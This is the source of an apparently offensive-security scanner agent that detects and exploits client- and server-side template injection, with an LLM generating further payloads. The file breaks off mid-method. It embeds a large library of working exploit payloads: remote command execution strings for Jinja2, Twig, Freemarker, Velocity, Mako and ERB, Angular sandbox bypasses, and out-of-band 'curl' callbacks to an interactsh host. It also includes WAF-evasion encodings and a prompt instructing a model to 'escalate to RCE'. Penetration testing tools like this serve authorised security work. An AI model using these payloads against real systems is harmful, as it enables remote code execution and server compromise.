import asyncio
import aiohttp
import re
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bugtrace.agents.base import BaseAgent
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.ui import dashboard
from bugtrace.core.job_manager import JobStatus
from bugtrace.core.event_bus import EventType
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.utils.logger import get_logger
from bugtrace.utils.parsers import XmlParser
from bugtrace.core.llm_client import llm_client
from bugtrace.core.config import settings
from dataclasses import dataclass, field
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation
from bugtrace.core.verbose_events import create_emitter

# v2.1.0: Import specialist utilities for payload loading from JSON (if needed)
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data

# v3.2.0: Import TechContextMixin for context-aware CSTI detection
from bugtrace.agents.mixins.tech_context import TechContextMixin

# v3.4: ManipulatorOrchestrator for HTTP attack campaigns
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy

@dataclass
class CSTIFinding:
    """
    Represents a confirmed CSTI/SSTI finding with strict verification data.
    """
    url: str                # The verified URL where exploitation works
    parameter: str
    type: str = "CSTI"
    severity: str = "HIGH"
    
    # Classification
    template_engine: str = "unknown"  # "angular", "jinja2", etc.
    engine_type: str = "unknown"      # "client-side" or "server-side"
    
    # Payload & Exploit
    payload: str = ""
    payload_syntax: str = ""          # "expression", "erb_tag", etc.
    
    # Verification
    verified_url: str = ""            # Same as url, but explicit
    original_url: str = ""            # Where scan started
    arithmetic_proof: bool = False
    baseline_check_passed: bool = False
    
    # Metadata
    description: str = ""
    reproduction_steps: List[str] = field(default_factory=list)
    reproduction_command: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)
    
    # Alternative confirmed payloads (up to 5)
    successful_payloads: List[str] = field(default_factory=list)

    # Validation status
    validated: bool = True
    status: str = "VALIDATED_CONFIRMED"


# V2 Enhancements: WAF & Interactsh Integration
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques
from bugtrace.tools.interactsh import InteractshClient

logger = get_logger("agents.csti")

class TemplateEngineFingerprinter:
    """Detect which template engine is in use."""

    ENGINE_SIGNATURES = {
        "angular": {
            "patterns": ["ng-app", "ng-model", "ng-bind", "angular.js", "angular.min.js"],
            "probe": "{{constructor.constructor('return 1')()}}",
            "success_indicator": "1"
        },
        "vue": {
            "patterns": ["v-if", "v-for", "v-model", "vue.js", "vue.min.js"],
            "probe": "{{7*7}}",
            "success_indicator": "49"
        },
        "jinja2": {
            "patterns": ["jinja", "flask", "werkzeug"],
            "probe": "{{config}}",
            "success_indicator": "Config"
        },
        "twig": {
            "patterns": ["twig", "symfony"],
            "probe": "{{7*7}}",
            "success_indicator": "49"
        },
        "freemarker": {
            "patterns": ["freemarker", ".ftl"],
            "probe": "${7*7}",
            "success_indicator": "49"
        },
        "velocity": {
            "patterns": ["velocity", ".vm"],
            "probe": "#set($x=7*7)$x",
            "success_indicator": "49"
        },
        "mako": {
            "patterns": ["mako"],
            "probe": "${7*7}",
            "success_indicator": "49"
        },
        "pebble": {
            "patterns": ["pebble"],
            "probe": "{{ 7*7 }}",
            "success_indicator": "49"
        },
        "smarty": {
            "patterns": ["smarty"],
            "probe": "{$smarty.version}",
            "success_indicator": "Smarty"
        },
        "erb": {
            "patterns": ["erb", "ruby", "rails"],
            "probe": "<%= 7*7 %>",
            "success_indicator": "49"
        }
    }

    @classmethod
    def fingerprint(cls, html: str, headers: dict = None) -> List[str]:
        """Return list of likely template engines."""
        detected = []
        html_lower = html.lower()

        for engine, data in cls.ENGINE_SIGNATURES.items():
            for pattern in data["patterns"]:
                if pattern.lower() in html_lower:
                    detected.append(engine)
                    break

        return detected if detected else ["unknown"]

PAYLOAD_LIBRARY = {
    # ================================================================
    # UNIVERSAL ARITHMETIC PROBES (work on most engines)
    # ================================================================
    "universal": [
        # THE OMNI-PROBE (User Inspired): XSS + CSTI + SSTI Polyglot
        "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{7*7}}${7*7}<% 7*7 %>",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "[[7*7]]",
        "{7*7}",
        "{{7*'7'}}",
        "${7*'7'}",
    ],

    # ================================================================
    # ANGULAR-SPECIFIC (CSTI) - IMPROVED 2026-01-30
    # ================================================================
    "angular": [
        # SIMPLE ARITHMETIC (highest priority - works on most Angular apps)
        "{{7*7}}",
        "{{7*'7'}}",
        "{{49}}",  # Direct number to test reflection
        # Constructor-based
        "{{constructor.constructor('return 7*7')()}}",
        "{{$on.constructor('return 7*7')()}}",
        "{{[].pop.constructor('return 7*7')()}}",
        "{{[].push.constructor('return 7*7')()}}",
        # Error-based detection
        "{{a]}}",
        "{{'a]'}}",
        # Sandbox bypasses (Angular 1.x - ginandjuice.shop uses older Angular)
        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(document.domain)');}}",
        "{{'a]'.constructor.prototype.charAt=[].join;$eval('x=alert(document.domain)');}}",
        "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(document.domain)\"].sort(toString.constructor);}}",
        # More sandbox bypasses for different Angular versions
        "{{$eval.constructor('return 7*7')()}}",
        "{{$parse.constructor('return 7*7')()}}",
        # ------------------------------------------------------------
        # DOUBLE-QUOTE VARIANTS (for servers that error on single quotes)
        # ginandjuice.shop returns 500 on single quotes, but accepts double quotes
        # ------------------------------------------------------------
        '{{constructor.constructor("return 7*7")()}}',
        '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("return 7*7")()}}',
        '{{[].pop.constructor("return 7*7")()}}',
        '{{[].push.constructor("return 7*7")()}}',
        '{{$eval.constructor("return 7*7")()}}',
        '{{$parse.constructor("return 7*7")()}}',
    ],

    # ================================================================
    # VUE-SPECIFIC (CSTI)
    # ================================================================
    "vue": [
        "{{7*7}}",
        "{{constructor.constructor('return 7*7')()}}",
        "{{_c.constructor('return 7*7')()}}",
    ],

    # ================================================================
    # JINJA2-SPECIFIC (SSTI)
    # ================================================================
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{self.__init__.__globals__}}",
        "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # OOB (with placeholder)
        "{{config.__class__.__init__.__globals__['os'].popen('curl {{INTERACTSH}}').read()}}",
        # Blind detection
        "{% for x in range(100000000) %}a{% endfor %}",  # DoS-based detection
    ],

    # ================================================================
    # TWIG-SPECIFIC (SSTI)
    # ================================================================
    "twig": [
        "{{7*7}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{app.request.server.all|join(',')}}",
        # OOB
        "{{['curl {{INTERACTSH}}']|filter('exec')}}",
    ],

    # ================================================================
    # FREEMARKER-SPECIFIC (SSTI)
    # ================================================================
    "freemarker": [
        "${7*7}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # OOB
        "${\"freemarker.template.utility.Execute\"?new()(\"curl {{INTERACTSH}}\")}",
    ],

    # ================================================================
    # VELOCITY-SPECIFIC (SSTI)
    # ================================================================
    "velocity": [
        "#set($x=7*7)$x",
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('id')",
        # OOB
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('curl {{INTERACTSH}}')",
    ],

    # ================================================================
    # MAKO-SPECIFIC (SSTI)
    # ================================================================
    "mako": [
        "${7*7}",
        "${self.module.cache.util.os.popen('id').read()}",
        "<%import os%>${os.popen('id').read()}",
        # OOB
        "<%import os%>${os.popen('curl {{INTERACTSH}}').read()}",
    ],

    # ================================================================
    # ERB-SPECIFIC (Ruby)
    # ================================================================
    "erb": [
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        # OOB
        "<%= system('curl {{INTERACTSH}}') %>",
    ],

    # ================================================================
    # POLYGLOTS (work across multiple engines)
    # ================================================================
    "polyglots": [
        "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",
        "${{7*7}}",
        "{{7*7}}[[7*7]]",
    ],

    # ================================================================
    # WAF BYPASS VARIANTS (encoded versions)
    # ================================================================
    "waf_bypass": [
        # URL encoded
        "%7b%7b7*7%7d%7d",
        # Unicode
        "\\u007b\\u007b7*7\\u007d\\u007d",
        # Double encoded
        "%257b%257b7*7%257d%257d",
        # HTML entities
        "&#123;&#123;7*7&#125;&#125;",
        # Mixed case (for JS engines)
        "{{7*7}}",
    ],
}

# =========================================================================
# VICTORY HIERARCHY: Early exit based on payload impact
# =========================================================================

HIGH_IMPACT_INDICATORS = [
    "id=",           # RCE: id command output
    "uid=",          # RCE: uid from id
    "whoami",        # RCE: whoami output
    "/etc/passwd",   # File read
    "root:",         # passwd content
    "__globals__",   # Python internals access
    "os.popen",      # Command execution
    "subprocess",    # Command execution
    "java.lang.Runtime" # Java RCE
]

MEDIUM_IMPACT_INDICATORS = [
    "49",            # Arithmetic evaluation (7*7)
    "Config",        # Config access
    "SECRET",        # Secret key access
]

# Parámetros más propensos a CSTI/SSTI
HIGH_PRIORITY_PARAMS = [
    # Template-related
    "template", "tpl", "view", "layout", "page",
    # Content rendering
    "content", "text", "body", "message", "msg",
    "title", "subject", "name", "description",
    # Dynamic
    "preview", "render", "output", "display",
    # Input
    "input", "value", "data", "query", "q", "search",
    # File/Path
    "file", "path", "include", "partial",
    # ADDED (2026-01-30): Common vulnerable params from real-world findings
    "category", "filter", "sort", "lang", "locale", "theme",
]

class CSTIAgent(BaseAgent, TechContextMixin):
    """
    CSTI Agent V2 - Intelligent Template Injection Specialist.

    Feature Set:
    - Binomial Arithmetic Proof (7*7=49)
    - WAF Detection & Q-Learning Bypass (UCB1)
    - Template Engine Fingerprinting
    - Targeted & Polyglot Payloads
    - Blind SSTI Detection via Interactsh (OOB)
    - Context-aware technology stack integration (v3.2)
    """
    
    def __init__(self, url: str, params: List[Dict] = None, report_dir: Path = None, event_bus=None):
        super().__init__(
            name="CSTIAgent",
            role="Template Injection Specialist",
            event_bus=event_bus,
            agent_id="csti_agent"
        )
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        self._detected_waf = None
        self._waf_confidence = 0.0
        self.interactsh = None
        self.interactsh_url = None
        self._max_impact_achieved = False

        # Load technology profile for framework-specific CSTI attacks
        from bugtrace.utils.tech_loader import load_tech_profile
        self.tech_profile = load_tech_profile(self.report_dir)

        # Queue consumption mode (Phase 20)
        self._queue_mode = False

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # Agent-specific fingerprint

        # WET → DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""

        # v3.2.0: Context-aware tech stack (loaded in start_queue_consumer)
        self._tech_stack_context: Dict = {}
        self._csti_prime_directive: str = ""

    async def _detect_waf_async(self) -> Tuple[str, float]:
        """Detect WAF using framework's intelligent fingerprinter."""
        try:
            waf_name, confidence = await waf_fingerprinter.detect(self.url)
            self._detected_waf = waf_name if waf_name != "unknown" else None
            self._waf_confidence = confidence

            if self._detected_waf:
                logger.info(f"[{self.name}] WAF Detected: {waf_name} ({confidence:.0%})")
                dashboard.log(f"[{self.name}] 🛡️ WAF: {waf_name} ({confidence:.0%})", "INFO")

            return waf_name, confidence
        except Exception as e:
            logger.debug(f"WAF detection failed: {e}")
            return "unknown", 0.0

    async def _get_encoded_payloads(self, payloads: List[str]) -> List[str]:
        """Apply Q-Learning optimized encoding to payloads."""
        if not self._detected_waf:
            return payloads

        encoded = []
        for payload in payloads:
            encoded.append(payload)  # Original

            # Apply WAF-specific encodings
            variants = encoding_techniques.encode_payload(
                payload,
                waf=self._detected_waf,
                max_variants=3
            )
            encoded.extend(variants)

        return list(dict.fromkeys(encoded))  # Dedupe preserving order

    def _finding_to_dict(self, finding: CSTIFinding) -> Dict:
        """Convert CSTIFinding object to dictionary for report."""
        result = {
            "type": finding.type,
            "url": finding.url,
            "parameter": finding.parameter,
            "payload": finding.payload,
            "severity": finding.severity,
            "template_engine": finding.template_engine,
            "injection_type": f"{finding.engine_type} Template Injection",

            "validated": finding.validated,
            "status": finding.status,
            "description": finding.description,
            "reproduction": finding.reproduction_command,
            "reproduction_steps": finding.reproduction_steps, # List

            "evidence": finding.evidence,

            # Additional metadata for deep dive report
            "csti_metadata": {
                "engine": finding.template_engine,
                "type": finding.engine_type,
                "syntax": finding.payload_syntax,
                "arithmetic_proof": finding.arithmetic_proof,
                "verified_url": finding.verified_url
            }
        }

        if finding.successful_payloads:
            result["successful_payloads"] = finding.successful_payloads

        return result
    
    def _generate_repro_steps(self, url: str, param: str, payload: str, curl_cmd: str) -> List[str]:
        """Generate step-by-step reproduction instructions."""
        return [
            f"1. Navigate to the verified target: {url}",
            f"2. Locate the parameter `{param}`",
            f"3. Inject the payload: `{payload}`",
            f"4. Expected observation: The expression is evaluated (e.g., 7*7 becomes 49).",
            f"5. Alternative: Run the provided cURL command:",
            f"   `{curl_cmd}`"
        ]

    # =========================================================================
    # FINDING VALIDATION: CSTI-specific validation (Phase 1 Refactor)
    # =========================================================================

    def _validate_before_emit(self, finding: Dict) -> Tuple[bool, str]:
        """
        CSTI-specific validation before emitting finding.

        Validates:
        1. Basic requirements (type, url) via parent
        2. Template engine is identified
        3. Has arithmetic proof or engine fingerprint evidence
        4. Payload contains template syntax
        """
        # Call parent validation first
        is_valid, error = super()._validate_before_emit(finding)
        if not is_valid:
            return False, error

        # CSTI-specific: Must have template engine identified
        template_engine = finding.get("template_engine", "unknown")
        if template_engine == "unknown":
            # Check nested finding structure
            nested = finding.get("finding", {})
            template_engine = nested.get("template_engine", "unknown")

        if template_engine == "unknown":
            return False, "CSTI requires identified template engine"

        # CSTI-specific: Must have proof (arithmetic, fingerprint, or Interactsh)
        evidence = finding.get("evidence", {})
        has_arithmetic = evidence.get("arithmetic_proof") or finding.get("arithmetic_proof")
        has_fingerprint = evidence.get("fingerprint") or template_engine != "unknown"
        has_interactsh = evidence.get("interactsh_callback")

        if not (has_arithmetic or has_fingerprint or has_interactsh):
            return False, "CSTI requires proof: arithmetic evaluation, fingerprint, or Interactsh callback"

        # CSTI-specific: Payload should contain template syntax
        payload = finding.get("payload", "")
        if not payload:
            nested = finding.get("finding", {})
            payload = nested.get("payload", "")

        template_markers = ['{{', '}}', '${', '}', '#{', '<%', '%>', '#set', '$x']
        if payload and not any(m in str(payload) for m in template_markers):
            return False, f"CSTI payload missing template syntax: {payload[:50]}"

        return True, ""

    def _emit_csti_finding(self, finding_dict: Dict, scan_context: str = None) -> Optional[Dict]:
        """
        Helper to emit CSTI finding using BaseAgent.emit_finding() with validation.

        Args:
            finding_dict: Finding dictionary to emit
            scan_context: Optional scan context to include

        Returns:
            The finding dict if emitted, None if rejected
        """
        # Ensure required fields
        if "type" not in finding_dict:
            finding_dict["type"] = "CSTI"

        if scan_context:
            finding_dict["scan_context"] = scan_context

        finding_dict["agent"] = self.name

        # Use BaseAgent's validated emit
        return self.emit_finding(finding_dict)

    def _record_bypass_result(self, payload: str, success: bool):
        """Record result for Q-Learning feedback."""
        if not self._detected_waf:
            return

        encoding_used = "unknown"
        if "%25" in payload:
            encoding_used = "double_url_encode"
        elif "\\u00" in payload:
            encoding_used = "unicode_encode"
        elif "&#" in payload:
            encoding_used = "html_entity_encode"

        strategy_router.record_result(self._detected_waf, encoding_used, success)

    async def _setup_interactsh(self):
        """Register with Interactsh for OOB validation."""
        try:
            self.interactsh = InteractshClient()
            await self.interactsh.register()
            self.interactsh_url = self.interactsh.get_url("csti_agent")
            logger.info(f"[{self.name}] Interactsh ready: {self.interactsh_url}")
        except Exception as e:
            logger.warning(f"Failed to setup Interactsh: {e}")
            self.interactsh = None

    async def _check_oob_hit(self, label: str) -> bool:
        """Check if we got an OOB callback."""
        if not self.interactsh:
            return False

        await asyncio.sleep(2)  # Wait for callback
        hit = await self.interactsh.check_hit(label)
        return hit is not None

    async def _fetch_page(self, session) -> str:
        """Fetch page content for fingerprinting."""
        try:
            async with session.get(self.url, timeout=10) as resp:
                return await resp.text()
        except Exception as e:
            logger.debug(f"_fetch_page failed: {e}")
            return ""

    async def _targeted_probe(self, session, param, engines) -> Optional[Dict]:
        """
        Probe using payloads specific to detected engines.

        Tech-aware: Prioritizes engines detected by Nuclei in tech_profile.
        """
        # Enhance engine detection with tech_profile data
        tech_engines = []
        if self.tech_profile and self.tech_profile.get("frameworks"):
            for framework in self.tech_profile["frameworks"]:
                fw_lower = framework.lower()
                if "angular" in fw_lower:
                    tech_engines.append("angular")
                    logger.info(f"[{self.name}] Tech-aware: Prioritizing Angular CSTI (detected: {framework})")
                elif "vue" in fw_lower:
                    tech_engines.append("vue")
                    logger.info(f"[{self.name}] Tech-aware: Prioritizing Vue CSTI (detected: {framework})")

        # Merge: tech_engines first, then regular detected engines
        prioritized_engines = list(dict.fromkeys(tech_engines + engines))  # Deduplicate while preserving order

        for engine in prioritized_engines:
            payloads = PAYLOAD_LIBRARY.get(engine, [])
            payloads = await self._get_encoded_payloads(payloads)

            for p in payloads:
                dashboard.set_current_payload(p, f"CSTI:{param}", f"Targeted ({engine})")
                content, verified_url = await self._test_payload(session, param, p)
                if content:
                    finding_obj = self._create_finding(param, p, f"targeted_probe_{engine}", verified_url=verified_url)
                    return self._finding_to_dict(finding_obj)
        return None

    async def _universal_probe(self, session, param) -> Optional[Dict]:
        """Probe using universal and polyglot payloads."""
        payloads = PAYLOAD_LIBRARY.get("universal", []) + PAYLOAD_LIBRARY.get("polyglots", [])
        payloads = await self._get_encoded_payloads(payloads)
        
        for p in payloads:
            dashboard.set_current_payload(p, f"CSTI:{param}", "Universal Probe")
            content, verified_url = await self._test_payload(session, param, p)
            if content:
                finding_obj = self._create_finding(param, p, "universal_probe", verified_url=verified_url)
                return self._finding_to_dict(finding_obj)
        return None

    async def _oob_probe(self, session, param, engines) -> Optional[Dict]:
        """Probe using OOB payloads injected with Interactsh URL."""
        if not self.interactsh_url:
            return None
            
        # Get OOB payloads for detected engines + generice
        candidates = []
        for engine in engines:
            candidates.extend([p for p in PAYLOAD_LIBRARY.get(engine, []) if "{{INTERACTSH}}" in p])
        
        # Also check jinja2 generic OOB if no specific engine found
        if not candidates:
             candidates.extend([p for p in PAYLOAD_LIBRARY.get("jinja2", []) if "{{INTERACTSH}}" in p])

        for p in candidates:
            # Inject unique label
            label = f"csti_{param}"
            real_payload = p.replace("{{INTERACTSH}}", self.interactsh_url)
            
            dashboard.set_current_payload(real_payload[:20]+"...", f"CSTI:{param}", "OOB Blind")

            # Fire and forget - send OOB payload
            try:
                target_url = self._inject(param, real_payload)
                async with session.get(target_url, timeout=3):
                    pass
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass  # OOB payloads may timeout - that's expected
                
            # Check for hit
            if await self._check_oob_hit(self.interactsh_url): # Check general hit
                 finding_obj = self._create_finding(param, real_payload, "blind_oob_confirmed")
                 return self._finding_to_dict(finding_obj)
                 
        return None

    def _prioritize_params(self, params: List[Dict]) -> List[Dict]:
        """Prioritize parameters likely to be template-injectable."""
        high = []
        medium = []
        low = []

        for item in params:
            param = item.get("parameter", "").lower()

            is_high = any(hp in param or param in hp for hp in HIGH_PRIORITY_PARAMS)

            if is_high:
                high.append(item)
            elif any(x in param for x in ["id", "num", "page", "limit"]):
                low.append(item)
            else:
                medium.append(item)

        if high:
            logger.info(f"[{self.name}] 🎯 High-priority params: {[h['parameter'] for h in high]}")

        return high + medium + low

    def _get_payload_impact_tier(self, payload: str, response: str) -> int:
        """
        Determine impact tier for CSTI/SSTI.
        Returns:
            3 = RCE/File Read → STOP IMMEDIATELY
            2 = Internals Access → STOP IMMEDIATELY
            1 = Arithmetic Eval → Try 1 more
            0 = No impact → Continue
        """
        combined = (payload + " " + response).lower()

        # TIER 3: RCE or File Read
        if any(ind.lower() in combined for ind in HIGH_IMPACT_INDICATORS):
            return 3

        # TIER 2: Internals Access
        if any(ind.lower() in " ".join(MEDIUM_IMPACT_INDICATORS).lower().split() for ind in ["__globals__", "os.popen", "config"]):
             # Simplified check based on constants logic
             if "__globals__" in combined or "os.popen" in combined or "config" in combined:
                 return 2

        # TIER 1: Arithmetic Evaluation
        if "49" in response and "7*7" in payload:
            return 1

        return 0

    def _should_stop_testing(self, payload: str, response: str, successful_count: int) -> Tuple[bool, str]:
        """Determine if we should stop based on Victory Hierarchy."""
        impact_tier = self._get_payload_impact_tier(payload, response)

        if impact_tier >= 3:
            self._max_impact_achieved = True
            return True, "🏆 MAXIMUM IMPACT: RCE or File Read achieved"

        if impact_tier >= 2:
            self._max_impact_achieved = True
            return True, "🏆 HIGH IMPACT: Internals access confirmed"

        if impact_tier >= 1 and successful_count >= 1:
            return True, "✅ Template evaluation confirmed"

        if successful_count >= 2:
            return True, "⚡ 2 successful payloads, moving on"

        return False, ""

    async def _test_post_injection(
        self,
        session: aiohttp.ClientSession,
        param: str,
        engines: List[str]
    ) -> Optional[Dict]:
        """Test POST parameters for template injection."""
        payloads = PAYLOAD_LIBRARY.get(engines[0], PAYLOAD_LIBRARY["universal"])[:5] if engines and engines[0] != "unknown" else PAYLOAD_LIBRARY["universal"][:5]

        for payload in payloads:
            finding = await self._test_single_post_payload(session, param, payload, engines)
            if finding:
                return finding

        return None

    async def _test_single_post_payload(
        self,
        session: aiohttp.ClientSession,
        param: str,
        payload: str,
        engines: List[str]
    ) -> Optional[Dict]:
        """Test a single POST payload."""
        try:
            data = {param: payload}
            async with session.post(self.url, data=data, timeout=5) as resp:
                content = await resp.text()
                return self._check_post_injection_success(resp, content, payload, param, engines)
        except Exception as e:
            logger.debug(f"POST test failed: {e}")
            return None

    def _check_post_injection_success(
        self,
        resp,
        content: str,
        payload: str,
        param: str,
        engines: List[str]
    ) -> Optional[Dict]:
        """Check if POST injection was successful."""
        if not ("49" in content and "7*7" in payload and payload not in content):
            return None

        engine = engines[0] if engines else "unknown"
        finding_obj = self._create_finding(f"POST:{param}", payload, "post_injection", verified_url=str(resp.url))
        finding_obj.template_engine = engine
        return self._finding_to_dict(finding_obj)

    async def _test_header_injection(
        self,
        session: aiohttp.ClientSession,
        engines: List[str]
    ) -> Optional[Dict]:
        """Test headers for template injection (rare but possible)."""
        test_headers = ["Referer", "X-Forwarded-For", "User-Agent"]
        payload = "{{7*7}}"

        for header in test_headers:
            finding = await self._test_single_header(session, header, payload)
            if finding:
                return finding

        return None

    async def _test_single_header(
        self,
        session: aiohttp.ClientSession,
        header: str,
        payload: str
    ) -> Optional[Dict]:
        """Test a single header for template injection."""
        try:
            headers = {header: payload}
            async with session.get(self.url, headers=headers, timeout=5) as resp:
                content = await resp.text()
                return self._check_header_injection_success(resp, content, header, payload)
        except Exception as e:
            logger.debug(f"operation failed: {e}")
            return None

    def _check_header_injection_success(
        self,
        resp,
        content: str,
        header: str,
        payload: str
    ) -> Optional[Dict]:
        """Check if header injection was successful."""
        if "49" not in content:
            return None

        finding_obj = self._create_finding(f"HEADER:{header}", payload, "header_injection", verified_url=str(resp.url))
        return self._finding_to_dict(finding_obj)

    def _template_get_system_prompt(self) -> str:
        """Get system prompt for template analysis."""
        return """You are an elite Template Injection specialist.
CSTI (Client-Side): Angular, Vue - executes in browser
SSTI (Server-Side): Jinja2, Twig, Freemarker - executes on server (more dangerous)

For each engine, you must know:
- Angular 1.x: {{constructor.constructor('code')()}} - sandbox bypass needed
- Vue 2.x: {{_c.constructor('code')()}}
- Jinja2: {{config}}, {{lipsum.__globals__['os'].popen('cmd').read()}}
- Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}

CRITICAL: Generate payloads that:
1. Prove code execution (not just reflection)
2. Include OOB callback for blind detection
3. Escalate to RCE if SSTI (server-side)"""

    def _template_build_user_prompt(
        self, param: str, detected_engines: List[str], interactsh_url: str, html: str
    ) -> str:
        """Build user prompt for LLM template analysis."""
        return f"""Analyze this page for Template Injection:
URL: {self.url}
Parameter: {param}
Detected Engines: {detected_engines}
OOB Callback: {interactsh_url}

HTML (truncated):
```html
{html[:6000]}
```

Generate 1-3 PRECISE payloads for the detected engine(s).
For each payload, explain:
1. Target engine
2. What it exploits (sandbox bypass, RCE, etc.)
3. Expected output

Response format (XML):
<payloads>
  <payload>
    <engine>angular|vue|jinja2|twig|etc</engine>
    <code>THE_PAYLOAD</code>
    <exploitation>What it does</exploitation>
    <expected_output>What to look for</expected_output>
  </payload>
</payloads>"""

    async def _llm_smart_template_analysis(
        self,
        html: str,
        param: str,
        detected_engines: List[str],
        interactsh_url: str
    ) -> List[Dict]:
        """LLM-First Strategy: Analyze HTML and generate targeted CSTI/SSTI payloads."""
        system_prompt = self._template_get_system_prompt()
        user_prompt = self._template_build_user_prompt(param, detected_engines, interactsh_url, html)

        try:
            response = await llm_client.generate(
                prompt=user_prompt,
                module_name="CSTI_SMART_ANALYSIS",
                system_prompt=system_prompt,
                model_override=settings.MUTATION_MODEL,
                max_tokens=3000,
                temperature=0.3
            )

            return self._parse_llm_payloads(response, interactsh_url)
        except Exception as e:
            logger.error(f"LLM Smart Analysis failed: {e}", exc_info=True)
            return []

    def _parse_llm_payloads(self, content: str, interactsh_url: str) -> List[Dict]:
        payloads = XmlParser.extract_list(content, "payload")
        parsed_items = []

        for p_str in payloads:
            code = XmlParser.extract_tag(p_str, "code")
            engine = XmlParser.extract_tag(p_str, "engine")

            if code:
                if "{{INTERACTSH}}" in code and interactsh_url:
                    code = code.replace("{{INTERACTSH}}", interactsh_url)

                parsed_items.append({
                    "code": code,
                    "engine": engine or "unknown"
                })

        return parsed_items


    async def _param_run_standard_probes(
        self, session: "aiohttp.ClientSession", param: str, engines: List[str]
    ) -> List[Dict]:
        """Run standard probes (targeted, universal, OOB)."""
        findings = []

        # Targeted probe
        if engines != ["unknown"]:
            finding = await self._targeted_probe(session, param, engines)
            if finding:
                findings.append(finding)
                self._record_bypass_result(finding["payload"], success=True)

        # Universal probe
        finding = await self._universal_probe(session, param)
        if finding:
            findings.append(finding)
            self._record_bypass_result(finding["payload"], success=True)

        # OOB probe
        finding = await self._oob_probe(session, param, engines)
        if finding:
            findings.append(finding)
            self._record_bypass_result(finding["payload"], success=True)

        return findings

    async def _param_run_alternative_vectors(
        self, session: "aiohttp.ClientSession", param: str, engines: List[str], param_findings: List
    ) -> List[Dict]:
        """Run alternative attack vectors (POST, headers, LLM)."""
        findings = []

        # POST injection
        finding = await self._test_post_injection(session, param, engines)
        if finding:
            findings.append(finding)

        # Header injection (rare)
        if not param_findings:
            finding = await self._test_header_injection(session, engines)
            if finding:
                findings.append(finding)

        # LLM advanced bypass (fallback)
        if self._detected_waf and not param_findings:
            finding = await self._llm_probe(session, param)
            if finding:
                findings.append(finding)

        return findings

    async def _test_parameter(self, session: "aiohttp.ClientSession", item: Dict, html: str) -> List[Dict]:
        """Test a single parameter for CSTI/SSTI vulnerabilities."""
        param = item.get("parameter")
        if not param:
            return []

        param_findings = []
        engines = TemplateEngineFingerprinter.fingerprint(html)
        
        # COST OPTIMIZATION (2026-02-01): Check reflection before LLM
        # If it's a client-side engine (Angular/Vue) and not reflected, LLM is likely a waste
        # v3.2 FIX: Skip this check for JS-rendered sites (empty HTML) - Angular renders dynamically
        is_client_side = any(e in ["angular", "vue"] for e in engines)
        is_js_rendered = len(html.strip()) < 500  # JS-rendered sites have minimal initial HTML
        if is_client_side and not is_js_rendered:
            is_reflected = await self._check_light_reflection(session, param)
            if not is_reflected:
                logger.debug(f"[{self.name}] Param '{param}' not reflected, skipping LLM for cost saving.")
                return []
        elif is_client_side and is_js_rendered:
            logger.info(f"[{self.name}] JS-rendered site detected with {engines[0]} - skipping HTTP reflection check")

        # Phase 1: LLM Smart Analysis
        if engines != ["unknown"]:
            smart_findings = await self._run_llm_smart_analysis(session, param, engines, html)
            param_findings.extend(smart_findings)

        if self._max_impact_achieved or len(param_findings) >= 2:
            return param_findings

        # Phase 2-4: Standard probes
        standard_findings = await self._param_run_standard_probes(session, param, engines)
        param_findings.extend(standard_findings)

        # Phase 5-7: Alternative vectors
        alternative_findings = await self._param_run_alternative_vectors(
            session, param, engines, param_findings
        )
        param_findings.extend(alternative_findings)

        return param_findings

    async def _run_llm_smart_analysis(self, session, param: str, engines: List[str], html: str) -> List[Dict]:
        """Run LLM smart analysis and test payloads."""
        findings = []
        interact_url_param = self.interactsh.get_url(f"csti_{param}") if self.interactsh else ""
        smart_payloads = await self._llm_smart_template_analysis(html, param, engines, interact_url_param)

        for sp in smart_payloads:
            if self._max_impact_achieved:
                break

            success_content, verified_url = await self._test_payload(session, param, sp["code"])
            if success_content:
                finding_obj = self._create_finding(param, sp["code"], "llm_smart_analysis", verified_url=verified_url)
                finding = self._finding_to_dict(finding_obj)
                findings.append(finding)

                should_stop, reason = self._should_stop_testing(sp["code"], success_content, len(findings))
                if should_stop:
                    dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
                    break

        return findings


    async def run_loop(self) -> Dict:
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🚀 Starting Template Injection analysis", "INFO")

        all_findings = []

        try:
            await self._prepare_scan()
            all_findings = await self._scan_all_parameters()
